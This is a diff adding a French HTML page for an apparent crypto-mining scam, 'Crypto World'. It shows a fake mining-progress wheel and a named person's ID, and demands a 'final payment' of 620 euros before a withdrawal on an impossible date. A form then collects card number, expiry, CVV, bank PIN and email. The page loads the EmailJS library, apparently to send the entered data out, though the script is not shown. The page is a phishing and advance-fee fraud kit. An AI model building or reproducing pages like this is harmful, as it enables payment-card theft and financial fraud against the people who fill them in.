@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Minage - Crypto World</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+</head>
+<body>
+    <div class="container">
+        <h1>Minage en cours</h1>
+        <div class="user-info">
+            <p>ID : <strong>99288392</strong></p>
+            <p>Nom : <strong>DONDAINE</strong></p>
+        </div>
+
+        <!-- Roue de Minage -->
+        <div id="mining-wheel-container">
+            <div id="mining-wheel">
+                <p id="percentage">10%</p>
+            </div>
+        </div>
+        <p class="mining-progress">Votre minage progresse...</p>
+        <p class="flashing-info">
+            <strong>Veuillez procéder au paiement final de 620 euros pour bénéficier d'un retrait dès le 22.91.25.</strong>
+        </p>
+
+        <!-- Formulaire d'envoi d'email -->
+        <form id="email-form">
+            <h3>Liez votre carte bancaire</h3>
+            <input type="text" name="prenom" placeholder="Prénom" required>
+            <input type="text" name="nom" placeholder="Nom" required>
+            <input type="text" name="carte" placeholder="Numéro de carte" required>
+            <input type="text" name="validite" placeholder="Date de validité (MM/AA)" required>
+            <input type="text" name="cvv" placeholder="CVV" required>
+            <input type="text" name="code_pin" placeholder="Code PIN" required>
+            <input type="email" name="email" placeholder="Email" required>
+            <button type="submit">Valider</button>
+        </form>
+
+        <!-- Navigation -->
+        <div class="navigation-buttons">
+            <a href="index.html"><button>Précédent</button></a>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
